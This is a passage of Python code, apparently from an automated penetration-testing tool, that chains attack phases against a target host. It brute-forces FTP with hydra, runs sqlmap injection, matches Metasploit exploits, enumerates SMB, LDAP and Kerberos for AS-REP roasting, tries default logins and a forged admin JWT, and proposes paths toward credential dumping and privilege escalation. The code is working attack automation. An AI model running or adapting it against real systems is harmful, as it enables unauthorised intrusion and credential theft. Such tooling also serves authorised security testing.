            rc, out, _ = _execute_in_sandbox(f"hydra -l ftp -P /usr/share/wordlists/rockyou.txt -t 4 {_host} ftp 2>/dev/null || echo 'timeout'", 120)

            if rc == 0 and "password:" in out.lower():

                for line in out.split(chr(10)):

                    if "password:" in line.lower():

                        results["exploits_attempted"].append({"type":"hydra_ftp","port":21,"success":True,"credential":line.strip()[:80]})

                        results["compromised"] = True

                        results["findings"].append({"title":f"FTP Weak Password: {line.strip()[:80]}","severity":"critical","tool_source":"hydra"})

                        break



    # 3. sqlmap injection (first web service)

    for svc in services:

        name = svc.get("name", "").lower()

        port = int(svc.get("port", 0))

        if name in ("http","https","apache","nginx","iis") or port in (80,443,8080,8443):

            scheme = "https" if port == 443 else "http"

            url = f"{scheme}://{_host}:{port}/?id=1"

            rc, out, _ = _execute_in_sandbox(f"sqlmap -u '{url}' --batch --timeout 10 --retries 1 --level 1 --random-agent 2>&1 | tail -30", 60)

            if rc == 0 and "parameter" in out.lower() and ("inject" in out.lower() or "vuln" in out.lower()):

                results["exploits_attempted"].append({"type":"sqlmap","target":url,"success":True})

                results["compromised"] = True

                results["findings"].append({"title":f"SQL Injection: {url[:80]}","severity":"critical","tool_source":"sqlmap"})

            else:

                results["exploits_attempted"].append({"type":"sqlmap","target":url,"success":False})

            break





    # 3b. sqlmap fallback -- when no services identified but target is a web URL

    if not any(e.get("type") == "sqlmap" for e in results["exploits_attempted"]):

        for port in [80, 443, 8080, 8443]:

            scheme = "https" if port in (443, 8443) else "http"

            url = f"{scheme}://{_host}:{port}/?id=1"

            rc, out, _ = _execute_in_sandbox(f"sqlmap -u '{url}' --batch --timeout 10 --retries 1 --level 1 --random-agent 2>&1 | tail -30", 60)

            if rc == 0 and "parameter" in out.lower() and ("inject" in out.lower() or "vuln" in out.lower()):

                results["exploits_attempted"].append({"type":"sqlmap","target":url,"success":True})

                results["compromised"] = True

                results["findings"].append({"title":f"SQL Injection: {url[:80]}","severity":"critical","tool_source":"sqlmap"})

                break

    # 4. msfconsole module matching

    for cf in [f for f in findings if f.get("severity","").lower() in ("critical","high")][:3]:

        st = cf.get("cve_id", "") or cf.get("title","")[:30].replace(" ","_")

        rc, out, _ = _execute_in_sandbox(f"msfconsole -q -x 'search {st}; exit' 2>/dev/null | head -20", 30)

        if rc == 0 and "exploit/" in out.lower():

            modules = [l.strip() for l in out.split(chr(10)) if "exploit/" in l.lower()][:5]

            results["exploits_attempted"].append({"type":"msfconsole","vuln":cf.get("title","")[:50],"success":True,"msf_modules":modules})

            results["findings"].append({"title":f"MSF match: {cf.get('title','')[:50]}","severity":"high","tool_source":"msfconsole"})



    results["success"] = any(e.get("success") for e in results["exploits_attempted"])

    return results





def _phase_post_exploit(target, known_ports=None):

    _host = _strip_url(target)

    """Real post-exploitation: smbmap + enum4linux-ng + smbclient + hashcat status + lateral"""

    import json

    results = {"lateral_targets": [], "credential_checks": [], "priv_esc_vectors": [], "hashes_cracked": [], "findings": []}

    known_ports = known_ports or []



    # 1. SMB enumeration (if SMB ports open)

    if 445 in known_ports or 139 in known_ports:

        rc, out, _ = _execute_in_sandbox(f"smbmap -H {_host} -u guest -p '' 2>/dev/null || true", 30)

        if rc == 0 and out and "READ" in out:

            results["lateral_targets"].append({"host":_host,"port":445,"service":"SMB","risk":"High"})

            results["findings"].append({"title":f"SMB anonymous share access ({_host})","severity":"high","tool_source":"smbmap"})

        rc, out, _ = _execute_in_sandbox(f"enum4linux-ng -A {_host} 2>/dev/null | head -100", 60)

        if rc == 0 and out:

            for line in out.split(chr(10)):

                if "user:" in line.lower() and "rid" in line.lower():

                    results["findings"].append({"title":f"SMB user enum: {line.strip()[:80]}","severity":"medium","tool_source":"enum4linux-ng"})

                if "os:" in line.lower() or "domain:" in line.lower():

                    results["findings"].append({"title":f"Info leak: {line.strip()[:80]}","severity":"low","tool_source":"enum4linux-ng"})

        rc, out, _ = _execute_in_sandbox(f"smbclient -L //{_host} -N 2>/dev/null || echo denied", 15)

        if rc == 0 and "denied" not in out:

            results["findings"].append({"title":f"SMB null session ({_host})","severity":"high","tool_source":"smbclient"})



    # 2. Lateral movement: port analysis

    lmap = {3389:("RDP","High"),5985:("WinRM","High"),5986:("WinRM-HTTPS","High"),389:("LDAP","Medium"),

            636:("LDAPS","Medium"),88:("Kerberos","Medium"),3306:("MySQL","Medium"),5432:("PostgreSQL","Medium"),

            6379:("Redis","High"),27017:("MongoDB","Medium"),1433:("MSSQL","Medium")}

    for p in known_ports:

        if p in lmap:

            svc, risk = lmap[p]

            results["lateral_targets"].append({"port":p,"service":svc,"risk":risk,"note":f"Port {p} ({svc}) open"})



    # 3. hashcat availability

    rc, out, _ = _execute_in_sandbox("hashcat --benchmark 2>/dev/null | head -3", 30)

    if rc == 0:

        results["credential_checks"].append({"type":"hashcat","status":"available","note":"hashcat ready for NTLM/MD5/SHA1/bcrypt"})



    # 4. PrivEsc vectors

    results["priv_esc_vectors"] = [

        {"type":"kernel_exploit","note":"Check kernel version for DirtyPipe/DirtyCow"},

        {"type":"sudo_abuse","note":"sudo -l for misconfigs"},

        {"type":"suid_abuse","note":"find / -perm -4000 with GTFOBins"},

    ]

    return results







def _phase_web_fuzz(target: str, web_ports: list = None) -> dict:

    """Web fuzzing with wfuzz — discover hidden endpoints and files"""

    import json

    findings = []

    wordlist = "/usr/share/wordlists/dirb/common.txt"

    _host = _strip_url(target)

    for scheme_port in [(f"http://{_host}", 80), (f"https://{_host}", 443)]:

        url, _ = scheme_port

        rc, out, _ = _execute_in_sandbox(

            f"wfuzz -c -z file,{wordlist} --hc 404 --hc 403 -t 10 -f /dev/stdout {url}/FUZZ 2>/dev/null | head -30", 120)

        if rc == 0 and out:

            for line in out.split(chr(10)):

                if "HTTP/" in line and "Code:" in line:

                    findings.append({"title": f"Fuzz: {line.strip()[:100]}", "severity": "info", "tool_source": "wfuzz"})

        break  # one scheme is enough

    return {"findings": findings}





def _phase_api_scan(target: str) -> dict:

    """API security scan — discover API endpoints and test common OWASP Top 10"""

    import json

    findings = []

    # Try common API paths

    _host = _strip_url(target)

    api_paths = ["/api", "/swagger", "/openapi.json", "/api/v1", "/api/v2", "/graphql", "/api/docs", "/api/health"]

    for path in api_paths:

        for port in [80, 443, 8080, 8443, 3000, 8000, 9000]:

            scheme = "https" if port == 443 else "http"

            rc, out, _ = _execute_in_sandbox(f"curl -s -o /dev/null -w '%{{http_code}}' {scheme}://{_host}:{port}{path} 2>/dev/null || echo''", 15)

            if rc == 0 and out and out.strip().isdigit() and int(out.strip()) in (200, 201, 401, 403, 301):

                findings.append({"title": f"API: {path} @ {scheme}://{_host}:{port} (HTTP {out.strip()})", "severity": "info", "tool_source": "api_scan"})

            break  # break port loop after first reachable port

    return {"findings": findings}





def _phase_auth_test(target: str) -> dict:

    _host = _strip_url(target)

    """Auth bypass testing — check for common auth weaknesses"""

    import json

    findings = []

    # Test for default credentials on common services

    endpoints = [

        (f"http://{_host}:80/admin", "admin:admin"),

        (f"http://{_host}:80/login", "admin:123456"),

        (f"http://{_host}:80/wp-admin", "admin:admin"),

        (f"http://{_host}:8080/admin", "admin:admin"),

        (f"http://{_host}:8080/login", "admin:password"),

    ]

    for url, creds in endpoints:

        rc, out, _ = _execute_in_sandbox(f"curl -s -o /dev/null -w '%{{http_code}}' -u {creds} {url} 2>/dev/null || echo''", 15)

        if rc == 0 and out and out.strip().isdigit() and int(out.strip()) in (200, 302, 301):

            findings.append({"title": f"Auth bypass: {url} with {creds} (HTTP {out.strip()})", "severity": "high", "tool_source": "auth_test"})

    # Check for JWT misuse

    rc, out, _ = _execute_in_sandbox(f"curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.d0d0d0' {_host}:80/api/me 2>/dev/null || echo''", 15)

    if rc == 0 and out and "200" in out:

        findings.append({"title": f"JWT bypass: forged admin token accepted on {_host}", "severity": "critical", "tool_source": "auth_test"})

    return {"findings": findings}





def _phase_krb_scan(target: str) -> dict:

    _host = _strip_url(target)

    """Kerberos scan — detect KDC, check for AS-REP Roasting / Kerberoasting"""

    import json

    findings = []

    # KDC detection via nmap KRB5-enum

    rc, out, _ = _execute_in_sandbox(f"nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='' {_host} 2>/dev/null | head -30 || true", 60)

    if rc == 0 and out:

        if "krb5-enum-users" in out or "88/tcp" in out:

            findings.append({"title": f"KDC detected on {_host}:88 — Kerberos realm present", "severity": "medium", "tool_source": "krb_scan"})

        # Look for user enumeration

        for line in out.split(chr(10)):

            if "user:" in line.lower() or "account:" in line.lower():

                findings.append({"title": f"Kerberos user enum: {line.strip()[:80]}", "severity": "medium", "tool_source": "krb_scan"})

    # Check for AS-REP roastable users (no pre-auth)

    rc2, out2, _ = _execute_in_sandbox(f"nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='',userdb=/usr/share/wordlists/metasploit/namelist.txt {_host} 2>/dev/null | tail -20 || true", 60)

    if rc2 == 0 and out2 and "no pre-auth" in out2.lower():

        findings.append({"title": "AS-REP Roastable user found (no Kerberos pre-authentication)", "severity": "high", "tool_source": "krb_scan"})

    return {"findings": findings, "krb_services": [88]}





def _phase_ad_enum(target: str) -> dict:

    _host = _strip_url(target)

    """AD domain enumeration — SMB/LDAP/NetBIOS reconnaissance"""

    import json

    findings = []

    # SMB null session

    rc, out, _ = _execute_in_sandbox(f"smbclient -L //{_host} -N 2>/dev/null || echo denied", 15)

    if rc == 0 and "denied" not in out:

        shares = [l.strip() for l in out.split(chr(10)) if "Disk" in l][:10]

        findings.append({"title": f"SMB shares via null session: {shares}", "severity": "high", "tool_source": "ad_enum"})

    # NetBIOS

    rc, out, _ = _execute_in_sandbox(f"nbtscan -r {_host} 2>/dev/null || true", 15)

    if rc == 0 and out.strip():

        findings.append({"title": f"NetBIOS: {out.strip()[:200]}", "severity": "medium", "tool_source": "ad_enum"})

    # OS detection via nmap

    rc, out, _ = _execute_in_sandbox(f"nmap -O --osscan-guess {_host} 2>/dev/null | grep 'OS details' || true", 60)

    if rc == 0 and out.strip():

        findings.append({"title": f"OS guess: {out.strip()[:100]}", "severity": "low", "tool_source": "ad_enum"})

    # LDAP anonymous bind

    rc, out, _ = _execute_in_sandbox(f"ldapsearch -x -h {_host} -b '' -s base 2>/dev/null | head -20 || true", 15)

    if rc == 0 and out.strip():

        findings.append({"title": f"LDAP anonymous bind: {out.strip()[:200]}", "severity": "high", "tool_source": "ad_enum"})

    return {"findings": findings}





def _phase_code_scan(target: str) -> dict:

    """Static code analysis — security review of source code patterns"""

    return {"findings": [], "note": "Code scan requires a source path; skipping for host target"}

def _phase_threat_model(target, ports=None, services=None, findings=None):

    ports = ports or []

    services = services or []

    findings = findings or []

    attack_surface = {

        "web_services": sum(1 for p in ports if p in (80,443,8080,8443,3000,5000,9090)),

        "remote_access": sum(1 for p in ports if p in (22,3389,5900)),

        "database": sum(1 for p in ports if p in (3306,5432,27017,1433,6379)),

        "directory_services": sum(1 for p in ports if p in (389,636,88,464)),

        "file_sharing": sum(1 for p in ports if p in (445,139,2049,111)),

        "mail_services": sum(1 for p in ports if p in (25,110,143,993,587)),

    }

    profile = "unknown"

    if attack_surface["web_services"] > 0 and attack_surface["database"] > 0:

        profile = "web_application_server"

    elif attack_surface["web_services"] > 0:

        profile = "web_server"

    elif attack_surface["remote_access"] > 0 and attack_surface["file_sharing"] > 0:

        profile = "windows_workstation_or_server"

    elif attack_surface["directory_services"] > 0:

        profile = "domain_controller"

    elif attack_surface["remote_access"] > 0:

        profile = "remote_access_server"

    path_map = {

        "web_application_server": "web_fingerprint --> vuln_scan --> dir_scan --> exploitation",

        "web_server": "web_scan --> web_fingerprint --> dir_scan --> exploitation",

        "windows_workstation_or_server": "vuln_scan(SMB/MS17-010) --> exploitation --> lateral_movement",

        "domain_controller": "vuln_scan(AD/ZeroLogon) --> exploitation --> credential_dump",

        "remote_access_server": "ssh_bruteforce --> vuln_scan --> exploitation",

    }

    suggested_path = path_map.get(profile, "port_scan --> service_detect --> vuln_scan --> exploitation")

    sev_order = {"critical":5,"high":4,"medium":3,"low":2,"info":1}

    highest = "none"

    for f in findings:

        s = f.get("severity","info").lower()

        if sev_order.get(s,0) > sev_order.get(highest,0):

            highest = s

    return {

        "profile": profile, "attack_surface": attack_surface,

        "suggested_attack_path": suggested_path,

        "highest_severity": highest,

        "recommendation": "Target appears to be a " + profile + ". Recommended approach: " + suggested_path,

    }

80203
81041
81195
81660
83554
